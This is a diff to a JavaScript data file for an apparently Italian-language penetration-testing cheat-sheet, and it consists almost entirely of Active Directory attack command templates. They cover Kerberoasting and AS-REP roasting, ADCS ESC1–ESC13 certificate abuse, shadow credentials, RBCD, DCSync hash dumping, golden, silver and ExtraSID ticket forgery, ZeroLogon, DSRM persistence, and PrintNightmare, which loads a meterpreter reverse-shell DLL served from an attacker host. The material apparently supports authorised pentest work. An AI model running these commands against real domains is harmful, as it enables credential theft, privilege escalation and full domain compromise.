+        "template": "# (se hai solo un .kirbi, es. da Rubeus tgtdeleg) decodifica e converti in ccache\necho '<kirbi_b64>' | base64 -d > <user>.kirbi\nimpacket-ticketConverter <user>.kirbi <user>.ccache\n\n# usa il TGT e sincronizza l'ora col DC (Kerberos tollera ~5 min di skew)\nexport KRB5CCNAME=$PWD/<user>.ccache\nsudo ntpdate <ip>\n\n# scrive lo SPN finto via Kerberos\nbloodyAD -k --host <dc_fqdn> -d <domain> set object <target> servicePrincipalName -v 'fake/spn'\n\n# richiede il TGS senza password, usando il ccache\nimpacket-GetUserSPNs -k -no-pass -dc-host <dc_fqdn> <domain>/ -request-user <target>\n\n# cleanup: rimuove lo SPN\nbloodyAD -k --host <dc_fqdn> -d <domain> set object <target> servicePrincipalName",
+        "description": "Quando NTLM è disabilitato o hai solo un TGT, nessuna password. Se parti da un `.kirbi` (es. da `Rubeus tgtdeleg /nowrap`), decodificalo con `base64 -d` e convertilo in ccache con `impacket-ticketConverter`, poi esporta `KRB5CCNAME`. Richiede l'FQDN del DC in `/etc/hosts` e l'orologio sincronizzato col DC, altrimenti Kerberos fallisce per skew. Crack con hashcat `-m 13100` (RC4) oppure `-m 19700` se l'account accetta solo AES."
       }
     ],
     "refs": [
@@ -9738,7 +9944,7 @@ const COMMANDS = [
       "genericwrite",
       "uac"
     ],
-    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add uac <target> DONT_REQ_PREAUTH",
+    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add uac <target> -f DONT_REQ_PREAUTH",
     "params": [
       {
         "key": "ip",
@@ -9774,13 +9980,13 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Linux (bloodyAD)",
-        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add uac <target> DONT_REQ_PREAUTH\n\nimpacket-GetNPUsers <domain>/<target> -dc-ip <ip> -no-pass -format hashcat\n\n# cleanup: rimetti la pre-auth\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' remove uac <target> DONT_REQ_PREAUTH",
+        "template": "# disattiva la pre-autenticazione Kerberos sull'account target\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add uac <target> -f DONT_REQ_PREAUTH\n\n# richiede l'AS-REP e salva l'hash in formato hashcat\nimpacket-GetNPUsers <domain>/<target> -dc-ip <ip> -no-pass -format hashcat\n\n# cleanup: rimette la pre-autenticazione come l'hai trovata\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' remove uac <target> -f DONT_REQ_PREAUTH",
         "description": "Togli la pre-auth, prendi l'AS-REP e rimettila. Crack con hashcat `-m 18200`."
       },
       {
         "id": "powerview",
         "label": "Windows (PowerView)",
-        "template": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose\n\n.\\Rubeus.exe asreproast /user:<target> /format:hashcat /nowrap\n\nSet-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose",
+        "template": "# toggle del flag DONT_REQ_PREAUTH sull'account target\nSet-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose\n\n# richiede l'AS-REP con Rubeus, formato hashcat\n.\\Rubeus.exe asreproast /user:<target> /format:hashcat /nowrap\n\n# ripete il toggle per rimettere il flag come prima\nSet-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose",
         "description": "Da Windows: flippi il bit `DONT_REQ_PREAUTH`, roast con Rubeus, poi riflippi (XOR di nuovo) per il cleanup."
       }
     ],
@@ -9855,7 +10061,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "ADCS — ESC1",
-    "description": "Su un template vulnerabile a ESC1 richiede un certificato indicando un SAN arbitrario con `-upn administrator@dominio`: la CA lo emette senza verificare l'identità del richiedente. Il certificato permette poi di autenticarsi come l'utente impersonato via PKINIT, ottenendone TGT e NT hash. Sui DC aggiornati (patch KB5014754 di maggio 2022) serve anche `-sid <SID_target>`, che si ricava da `certipy-ad find` o `lookupsid.py`, altrimenti `certipy-ad auth` fallisce.",
+    "description": "Su un template vulnerabile a ESC1 richiede un certificato indicando un SAN arbitrario con `-upn administrator@dominio`: la CA lo emette senza verificare l'identità del richiedente. Il certificato permette poi di autenticarsi come l'utente impersonato via PKINIT, ottenendone TGT e NT hash. Sui DC aggiornati (patch KB5014754 di maggio 2022) serve anche `-sid <SID_target>`, che si ricava da `certipy-ad find` o `impacket-lookupsid`, altrimenti `certipy-ad auth` fallisce.",
     "platform": "linux",
     "requires": [
       "password"
@@ -9984,7 +10190,7 @@ const COMMANDS = [
       "ntlmrelayx",
       "esc8"
     ],
-    "template": "ntlmrelayx.py -t http://<ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+    "template": "impacket-ntlmrelayx -t http://<ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
     "params": [
       {
         "key": "ip",
@@ -10070,7 +10276,7 @@ const COMMANDS = [
         "id": "printerbug",
         "label": "PrinterBug (MS-RPRN)",
         "template": "python3 printerbug.py '<domain>/<user>:<password>'@<ip> <attacker>",
-        "description": "Sfrutta lo spooler di stampa (MS-RPRN), spesso attivo di default. Verifica prima che il servizio risponda con `rpcdump.py @<ip> | grep MS-RPRN`."
+        "description": "Sfrutta lo spooler di stampa (MS-RPRN), spesso attivo di default. Verifica prima che il servizio risponda con `impacket-rpcdump @<ip> | grep MS-RPRN`."
       },
       {
         "id": "dfscoerce",
@@ -10082,7 +10288,7 @@ const COMMANDS = [
   },
   {
     "id": "addcomputer",
-    "name": "addcomputer.py — crea computer (RBCD)",
+    "name": "impacket-addcomputer — crea computer (RBCD)",
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "Delegation (RBCD)",
@@ -10100,7 +10306,7 @@ const COMMANDS = [
       "maq",
       "rbcd"
     ],
-    "template": "addcomputer.py -computer-name '<newhost>$' -computer-pass '<newpass>' -dc-ip <ip> '<domain>/<user>:<password>'",
+    "template": "impacket-addcomputer -computer-name '<newhost>$' -computer-pass '<newpass>' -dc-ip <ip> '<domain>/<user>:<password>'",
     "params": [
       {
         "key": "newhost",
@@ -10140,7 +10346,7 @@ const COMMANDS = [
   },
   {
     "id": "rbcd-write",
-    "name": "rbcd.py — scrivi AllowedToAct",
+    "name": "impacket-rbcd — scrivi AllowedToAct",
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "Delegation (RBCD)",
@@ -10195,7 +10401,7 @@ const COMMANDS = [
     "subcategory": "priv-esc",
     "group": "ACL Abuse",
     "description": "Con `GenericWrite` o `GenericAll` sull'attributo `msDS-KeyCredentialLink` del target si aggiunge una chiave propria e se ne ottiene l'NT hash via PKINIT, senza resettare la password dell'utente. `shadow auto` svolge tutto da solo: aggiunta, autenticazione, NT hash e pulizia.",
-    "platform": "linux",
+    "platform": "cross-platform",
     "requires": [
       "password"
     ],
@@ -10234,6 +10440,21 @@ const COMMANDS = [
         "placeholder": "victim"
       },
       {
+        "key": "pfxb64",
+        "label": "PFX base64 (da Whisker)",
+        "placeholder": "MIIJ..."
+      },
+      {
+        "key": "pfxpass",
+        "label": "PFX password (da Whisker)",
+        "placeholder": "generata-da-add"
+      },
+      {
+        "key": "deviceid",
+        "label": "Device ID (da add)",
+        "placeholder": "2de4643a-..."
+      },
+      {
         "key": "dc",
         "label": "DC IP",
         "ctx": "ip",
@@ -10252,13 +10473,23 @@ const COMMANDS = [
         "label": "Con Kerberos",
         "template": "certipy-ad shadow auto -u <user>@<domain> -k -account <target> -dc-ip <dc>",
         "description": "Come sopra ma via Kerberos (`-k`, usa il ccache): utile se NTLM è disabilitato."
+      },
+      {
+        "id": "whisker",
+        "label": "Whisker (Windows)",
+        "template": "# 1. scrive msDS-KeyCredentialLink sul target usando il token corrente (nessuna password)\n.\\Whisker.exe add /target:<target>\n\n# 2. Rubeus (gia' stampato da add): PKINIT col PFX -> TGT + UnPAC-the-hash -> NT hash\n.\\Rubeus.exe asktgt /user:<target> /certificate:<pfxb64> /password:<pfxpass> /getcredentials /nowrap\n\n# 3. cleanup: rimuovi la key scritta (deviceID stampato da add)\n.\\Whisker.exe remove /target:<target> /deviceid:<deviceid>",
+        "description": "Da un host Windows col token di `<user>`: `add` scrive la key e stampa gia' il comando Rubeus pronto, con PFX e password generati da lui. `asktgt /getcredentials` fa PKINIT e UnPAC-the-hash restituendo l'NT hash. La password del target non viene mai toccata."
       }
     ],
-    "note": "# pywhisker (passi separati)\nQuando serve maggiore controllo sulla sequenza di aggiunta, TGT, NT hash e cleanup:\n- `pywhisker.py --dc-ip <dc> -d <domain> -u <user> -p '<password>' --target <target> --action add`\n- `gettgtpkinit.py -cert-pfx generated.pfx -pfx-pass '<pfxpass>' -dc-ip <dc> <domain>/<target> t.ccache`\n- `getnthash.py -key <as_rep_key> <domain>/<target>`\n- cleanup: `pywhisker.py ... --action remove --device-id <id>`",
+    "note": "# pywhisker (passi separati)\nQuando serve maggiore controllo sulla sequenza di aggiunta, TGT, NT hash e cleanup:\n- `pywhisker.py --dc-ip <dc> -d <domain> -u <user> -p '<password>' --target <target> --action add`\n- `gettgtpkinit.py -cert-pfx generated.pfx -pfx-pass '<pfxpass>' -dc-ip <dc> <domain>/<target> t.ccache`\n- `getnthash.py -key <as_rep_key> <domain>/<target>`\n- cleanup: `pywhisker.py ... --action remove --device-id <id>`\n\n# Se il KDC non supporta PKINIT\nShadow credentials richiede un DC con PKINIT (certificato KDC, tipico dove c'è AD CS). Se manca, `certipy`/`pywhisker` falliscono al login PKINIT e la tecnica non è applicabile: ripiega sul targeted Kerberoast, scrivendo un SPN sul target con lo stesso `GenericWrite` e poi `GetUserSPNs -request-user <target>`.",
     "refs": [
       {
         "label": "Certipy — GitHub",
         "url": "https://github.com/ly4k/Certipy"
+      },
+      {
+        "label": "Whisker — GitHub",
+        "url": "https://github.com/eladshamir/Whisker"
       }
     ]
   },
@@ -10282,7 +10513,7 @@ const COMMANDS = [
       "nxc",
       "loot"
     ],
-    "template": "nxc smb <dc> -u '<user>' -p '<password>' --laps",
+    "template": "nxc ldap <dc> -u '<user>' -p '<password>' -M laps",
     "params": [
       {
         "key": "dc",
@@ -10318,8 +10549,8 @@ const COMMANDS = [
       {
         "id": "laps",
         "label": "LAPS (nxc)",
-        "template": "nxc smb <dc> -u '<user>' -p '<password>' --laps",
-        "description": "Password admin locale via LAPS sui computer leggibili."
+        "template": "nxc ldap <dc> -u '<user>' -p '<password>' -M laps",
+        "description": "Password admin locale (`ms-Mcs-AdmPwd`) di tutti i computer leggibili. Il modulo sta su `ldap`: il flag `--laps` di `nxc smb` è un’altra cosa, serve ad autenticarsi con la password LAPS, non a leggerla."
       },
       {
         "id": "gmsa",
@@ -10355,7 +10586,7 @@ const COMMANDS = [
       "rubeus",
       "coerce"
     ],
-    "template": "# 1. sulla macchina con unconstrained: cattura i TGT\n.\\Rubeus.exe monitor /interval:5 /nowrap\n\n# 2. da Kali: forza il DC$\ncoercer coerce -u '<user>' -p '<password>' -d <domain> -l <lhost> -t <dc>\n\n# 3. inietta il TGT del DC$ catturato\n.\\Rubeus.exe ptt /ticket:<tgt_b64>\n\nmimikatz # lsadump::dcsync /user:<domain>\\Administrator",
+    "template": "# sulla macchina con delega unconstrained: cattura i TGT in arrivo\n.\\Rubeus.exe monitor /interval:5 /nowrap\n\n# da Kali: forza il DC ad autenticarsi verso di te\ncoercer coerce -u '<user>' -p '<password>' -d <domain> -l <lhost> -t <dc>\n\n# inietta in memoria il TGT del DC appena catturato\n.\\Rubeus.exe ptt /ticket:<tgt_b64>\n\n# con il TGT del DC, replica gli hash del dominio\nmimikatz # lsadump::dcsync /user:<domain>\\Administrator",
     "params": [
       {
         "key": "user",
@@ -10461,7 +10692,7 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Linux (getST)",
-        "template": "impacket-getST -spn '<spn>' -impersonate Administrator -dc-ip <ip> '<domain>/<user>:<password>'\n\nexport KRB5CCNAME='Administrator@<spn>@<domain>.ccache'\n\nimpacket-psexec -k -no-pass <host>",
+        "template": "# richiede un TGS per lo SPN impersonando Administrator\nimpacket-getST -spn '<spn>' -impersonate Administrator -dc-ip <ip> '<domain>/<user>:<password>'\n\n# punta la cache Kerberos al ticket appena ottenuto\nexport KRB5CCNAME='Administrator@<spn>@<domain>.ccache'\n\n# usa il ticket per aprire una shell sull'host target\nimpacket-psexec -k -no-pass <host>",
         "description": "Forgi il ticket come Administrator verso lo SPN, lo carichi e accedi al servizio."
       },
       {
@@ -10498,7 +10729,7 @@ const COMMANDS = [
       "secretsdump",
       "impacket"
     ],
-    "template": "secretsdump.py <domain>/<user>:<password>@<ip> -just-dc-ntlm",
+    "template": "impacket-secretsdump <domain>/<user>:<password>@<ip> -just-dc-ntlm",
     "params": [
       {
         "key": "domain",
@@ -10529,13 +10760,13 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Tutti NTLM",
-        "template": "secretsdump.py <domain>/<user>:<password>@<ip> -just-dc-ntlm",
+        "template": "impacket-secretsdump <domain>/<user>:<password>@<ip> -just-dc-ntlm",
         "description": "Hash NTLM di tutto il dominio."
       },
       {
         "id": "krbtgt",
         "label": "Solo krbtgt",
-        "template": "secretsdump.py <domain>/<user>:<password>@<ip> -just-dc-user krbtgt",
+        "template": "impacket-secretsdump <domain>/<user>:<password>@<ip> -just-dc-user krbtgt",
         "description": "Hash del `krbtgt` (per il Golden Ticket)."
       }
     ]
@@ -10559,7 +10790,7 @@ const COMMANDS = [
       "krbtgt",
       "persistence"
     ],
-    "template": "ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain <domain> Administrator",
+    "template": "impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain <domain> Administrator",
     "params": [
       {
         "key": "krbtgt",
@@ -10582,7 +10813,7 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Linux (ticketer)",
-        "template": "ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain <domain> Administrator",
+        "template": "impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain <domain> Administrator",
         "description": "Crea `Administrator.ccache`; poi `export KRB5CCNAME=Administrator.ccache`."
       },
       {
@@ -10595,7 +10826,7 @@ const COMMANDS = [
   },
   {
     "id": "getst-s4u",
-    "name": "getST.py — S4U2Self / S4U2Proxy",
+    "name": "impacket-getST — S4U2Self / S4U2Proxy",
     "category": "active-directory",
     "subcategory": "persistence",
     "group": "Ticket Forgery",
@@ -10612,7 +10843,7 @@ const COMMANDS = [
       "impacket",
       "s4u"
     ],
-    "template": "getST.py -spn 'cifs/<target>' -impersonate '<impersonate>' '<domain>/<user>:<password>'",
+    "template": "impacket-getST -spn 'cifs/<target>' -impersonate '<impersonate>' '<domain>/<user>:<password>'",
     "params": [
       {
         "key": "target",
@@ -10788,49 +11019,49 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "ESC4 (write template)",
-        "template": "certipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -save-old\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template>\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn Administrator@<domain>\n# RIPRISTINA il template originale\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -configuration <template>.json",
+        "template": "# salva la configurazione attuale del template, da ripristinare dopo\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -save-old\n\n# rende il template vulnerabile: l'enrollee fornisce il subject\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template>\n\n# richiede un certificato come Administrator sfruttando il template\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn Administrator@<domain>\n\n# cleanup obbligatorio: rimette il template come l'hai trovato\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -configuration <template>.json",
         "description": "Salvi la config, riscrivi il template come ESC1, richiedi il cert come Administrator, poi ripristini l'originale."
       },
       {
         "id": "esc7",
         "label": "ESC7 (Manage CA)",
-        "template": "certipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -add-officer <user>\ncertipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -enable-template SubCA\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template SubCA -upn Administrator@<domain>\ncertipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -issue-request <id>\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -retrieve <id>",
+        "template": "# ti aggiunge come officer della CA\ncertipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -add-officer <user>\n\n# riabilita il template SubCA sulla CA\ncertipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -enable-template SubCA\n\n# richiede un certificato per Administrator: resta in pending\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template SubCA -upn Administrator@<domain>\n\n# come officer, approvi la tua stessa richiesta\ncertipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -issue-request <id>\n\n# scarica il certificato emesso\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -retrieve <id>",
         "description": "Aggiunge l'account come Officer, abilita SubCA, invia la richiesta che resta in pending, la emette sfruttando il ruolo di Officer e infine recupera il certificato."
       },
       {
         "id": "esc2",
         "label": "ESC2 (Any Purpose)",
-        "template": "certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn administrator@<domain>\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
+        "template": "# richiede un certificato Any Purpose impersonando administrator\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn administrator@<domain>\n\n# autentica con il PFX e recupera l'hash NT\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
         "description": "Template con EKU «Any Purpose» o senza EKU: il certificato vale per qualunque scopo, Client Authentication compresa. Si richiede come in ESC1 mettendo l'UPN di Administrator nel SAN."
       },
       {
         "id": "esc3",
         "label": "ESC3 (Enrollment Agent)",
-        "template": "# 1. richiedi il certificato Enrollment Agent\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template>\n# 2. usa quel cert per emetterne uno «per conto di» Administrator sul template User\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template User -on-behalf-of '<domain>\\administrator' -pfx <user>.pfx\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
+        "template": "# richiede il certificato Enrollment Agent\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template>\n\n# con quel cert, emette un certificato «per conto di» administrator\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template User -on-behalf-of '<domain>\\administrator' -pfx <user>.pfx\n\n# autentica con il PFX ottenuto\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
         "description": "Il template ha l'EKU Certificate Request Agent. Si ottiene prima un cert da Enrollment Agent, poi lo si usa per richiedere un certificato on-behalf-of Administrator su un template di enrollment normale."
       },
       {
         "id": "esc6",
         "label": "ESC6 (CA flag SAN)",
-        "template": "certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template User -upn administrator@<domain>\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
+        "template": "# con EDITF_ATTRIBUTESUBJECTALTNAME2 attivo, l'UPN lo scegli tu\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template User -upn administrator@<domain>\n\n# autentica con il PFX e recupera l'hash NT\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
         "description": "La CA ha il flag EDITF_ATTRIBUTESUBJECTALTNAME2 attivo: accetta un SAN arbitrario su qualsiasi template con autenticazione, anche uno standard come User. Stesso effetto di ESC1 senza bisogno di un template vulnerabile."
       },
       {
         "id": "esc9",
         "label": "ESC9 (no security extension)",
-        "template": "# serve GenericWrite/ForceChangePassword sul <target> + template senza msDS-SecurityExtension\n# 1. imposta l'UPN della vittima al valore 'administrator' (senza @dominio)\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn administrator -dc-ip <ip>\n# 2. richiedi il cert come la vittima\ncertipy-ad req -u '<target>@<domain>' -p '<newpass>' -ca <ca> -template <template> -dc-ip <ip>\n# 3. ripristina l'UPN originale, poi autentica\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn '<target>@<domain>' -dc-ip <ip>\ncertipy-ad auth -pfx administrator.pfx -domain <domain> -dc-ip <ip>",
+        "template": "# serve GenericWrite o ForceChangePassword sul target, più un template senza msDS-SecurityExtension\n\n# imposta l'UPN della vittima su 'administrator', senza dominio\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn administrator -dc-ip <ip>\n\n# richiede il certificato impersonando la vittima\ncertipy-ad req -u '<target>@<domain>' -p '<newpass>' -ca <ca> -template <template> -dc-ip <ip>\n\n# ripristina l'UPN originale della vittima\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn '<target>@<domain>' -dc-ip <ip>\n\n# autentica con il certificato e recupera l'hash NT\ncertipy-ad auth -pfx administrator.pfx -domain <domain> -dc-ip <ip>",
         "description": "Template senza Security Extension: il certificato viene mappato per UPN e non per SID. Si cambia temporaneamente l'UPN della vittima in `administrator`, si emette il cert a suo nome e all'auth il DC lo mappa sull'Administrator reale. Ripristinare sempre l'UPN."
       },
       {
         "id": "esc10",
         "label": "ESC10 (weak cert mapping)",
-        "template": "# DC con StrongCertificateBinding in Compatibility/Disabled (mapping debole)\n# stesso flusso di ESC9: cambia UPN della vittima, richiedi il cert, ripristina, autentica\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn administrator -dc-ip <ip>\ncertipy-ad req -u '<target>@<domain>' -p '<newpass>' -ca <ca> -template <template> -dc-ip <ip>\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn '<target>@<domain>' -dc-ip <ip>\ncertipy-ad auth -pfx administrator.pfx -domain <domain> -dc-ip <ip>",
+        "template": "# DC con StrongCertificateBinding in Compatibility o Disabled: mapping debole\n\n# imposta l'UPN della vittima su 'administrator', senza dominio\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn administrator -dc-ip <ip>\n\n# richiede il certificato impersonando la vittima\ncertipy-ad req -u '<target>@<domain>' -p '<newpass>' -ca <ca> -template <template> -dc-ip <ip>\n\n# ripristina l'UPN originale della vittima\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn '<target>@<domain>' -dc-ip <ip>\n\n# autentica con il certificato e recupera l'hash NT\ncertipy-ad auth -pfx administrator.pfx -domain <domain> -dc-ip <ip>",
         "description": "Mappatura certificato debole lato DC (chiave CertificateMappingMethods o binding non forzato). Si sfrutta come ESC9 manipolando l'UPN della vittima: utile quando il template non è ESC9 ma il DC accetta comunque il mapping debole."
       },
       {
         "id": "esc13",
         "label": "ESC13 (issuance policy → gruppo)",
-        "template": "# template con issuance policy il cui OID è legato a un gruppo privilegiato (msDS-OIDToGroupLink)\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template>\ncertipy-ad auth -pfx <user>.pfx -dc-ip <ip>",
+        "template": "# template con issuance policy il cui OID è legato a un gruppo privilegiato (msDS-OIDToGroupLink)\n\n# richiede il certificato dal template con la policy\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template>\n\n# autentica: il certificato porta con sé l'appartenenza al gruppo\ncertipy-ad auth -pfx <user>.pfx -dc-ip <ip>",
         "description": "Il template ha una issuance policy con OID collegato a un gruppo (msDS-OIDToGroupLink). Il TGT ottenuto col certificato eredita la SID di quel gruppo: si diventa membro effettivo di un gruppo privilegiato senza modificarne l'appartenenza."
       }
     ]
@@ -10930,7 +11161,7 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Exploit + DCSync",
-        "template": "python3 set_empty_pw.py <dchost> <ip>\nsecretsdump.py '<domain>/<dchost>$@<ip>' -no-pass -just-dc",
+        "template": "# azzera la password del computer account del DC\npython3 set_empty_pw.py <dchost> <ip>\n\n# con la password vuota, replica gli hash del dominio\nimpacket-secretsdump '<domain>/<dchost>$@<ip>' -no-pass -just-dc",
         "description": "Azzera la password del DC$ e con l'account macchina vuoto fa il DCSync di tutti gli hash, krbtgt compreso. Subito dopo va ripristinata la password (vedi nota)."
       },
       {
@@ -11069,13 +11300,13 @@ const COMMANDS = [
       {
         "id": "scan",
         "label": "Verifica vulnerabilità",
-        "template": "rpcdump.py @<ip> | egrep 'MS-RPRN|MS-PAR'",
+        "template": "impacket-rpcdump @<ip> | egrep 'MS-RPRN|MS-PAR'",
         "description": "Controlla che il Print Spooler (MS-RPRN) sia esposto sul DC."
       },
       {
         "id": "default",
         "label": "Exploit (cube0x0)",
-        "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=8080 -f dll -o payload.dll\nsudo smbserver.py -smb2support share ./\npython3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\payload.dll'",
+        "template": "# genera la DLL con il payload meterpreter\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=8080 -f dll -o payload.dll\n\n# la pubblica su una share SMB raggiungibile dal target\nsudo impacket-smbserver -smb2support share ./\n\n# fa caricare la DLL allo spooler del target\npython3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\payload.dll'",
         "description": "Genera la DLL, la ospita via SMB e la esegue come SYSTEM sul DC."
       }
     ],
@@ -11107,7 +11338,7 @@ const COMMANDS = [
       "writedacl",
       "dcsync"
     ],
-    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add dcsync <user>\nsecretsdump.py <domain>/<user>:'<password>'@<ip> -just-dc-ntlm\n\n# cleanup: rimuovi il diritto di replica\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' remove dcsync <user>",
+    "template": "# si concede i diritti di replica (DCSync) sul dominio\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add dcsync <user>\n\n# replica gli hash NTLM del dominio\nimpacket-secretsdump <domain>/<user>:'<password>'@<ip> -just-dc-ntlm\n\n# cleanup: rimuove i diritti di replica appena aggiunti\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' remove dcsync <user>",
     "params": [
       {
         "key": "ip",
@@ -11154,7 +11385,7 @@ const COMMANDS = [
       "extrasid",
       "sid-history"
     ],
-    "template": "ticketer.py -nthash <krbtgt> -domain <childdomain> -domain-sid <childsid> -extra-sid <parentsid>-519 hacker",
+    "template": "impacket-ticketer -nthash <krbtgt> -domain <childdomain> -domain-sid <childsid> -extra-sid <parentsid>-519 hacker",
     "params": [
       {
         "key": "krbtgt",
@@ -11198,13 +11429,13 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Manuale (ticketer)",
-        "template": "ticketer.py -nthash <krbtgt> -domain <childdomain> -domain-sid <childsid> -extra-sid <parentsid>-519 hacker\nexport KRB5CCNAME=hacker.ccache\npsexec.py <childdomain>/hacker@<parentdc> -k -no-pass",
+        "template": "# forgia un golden ticket con il SID degli Enterprise Admins del dominio padre\nimpacket-ticketer -nthash <krbtgt> -domain <childdomain> -domain-sid <childsid> -extra-sid <parentsid>-519 hacker\n\n# punta la cache Kerberos al ticket forgiato\nexport KRB5CCNAME=hacker.ccache\n\n# usa il ticket per una shell sul DC del dominio padre\nimpacket-psexec <childdomain>/hacker@<parentdc> -k -no-pass",
         "description": "Crei il ticket con l'ExtraSID, lo carichi e accedi al parent DC."
       },
       {
         "id": "shortcut",
         "label": "Automatico (raiseChild)",
-        "template": "raiseChild.py -target-exec <parentdcip> <childdomain>/<user>:<password>",
+        "template": "impacket-raiseChild -target-exec <parentdcip> <childdomain>/<user>:<password>",
         "description": "Fa tutto in un comando (dump `krbtgt`, SID, ticket, exec)."
       }
     ]
@@ -11227,7 +11458,7 @@ const COMMANDS = [
       "silver-ticket",
       "kerberos"
     ],
-    "template": "ticketer.py -nthash <servicehash> -domain-sid <sid> -domain <domain> -spn <spn> Administrator",
+    "template": "impacket-ticketer -nthash <servicehash> -domain-sid <sid> -domain <domain> -spn <spn> Administrator",
     "params": [
       {
         "key": "servicehash",
@@ -11255,7 +11486,7 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Linux (ticketer)",
-        "template": "ticketer.py -nthash <servicehash> -domain-sid <sid> -domain <domain> -spn <spn> Administrator",
+        "template": "impacket-ticketer -nthash <servicehash> -domain-sid <sid> -domain <domain> -spn <spn> Administrator",
         "description": "Crea il ticket per lo SPN indicato."
       },
       {
@@ -11301,7 +11532,7 @@ const COMMANDS = [
       "dsrm",
       "persistence"
     ],
-    "template": "New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD\n.\\mimikatz.exe \"sekurlsa::pth /domain:<dchost> /user:Administrator /ntlm:<dsrmhash> /run:powershell.exe\" \"exit\"",
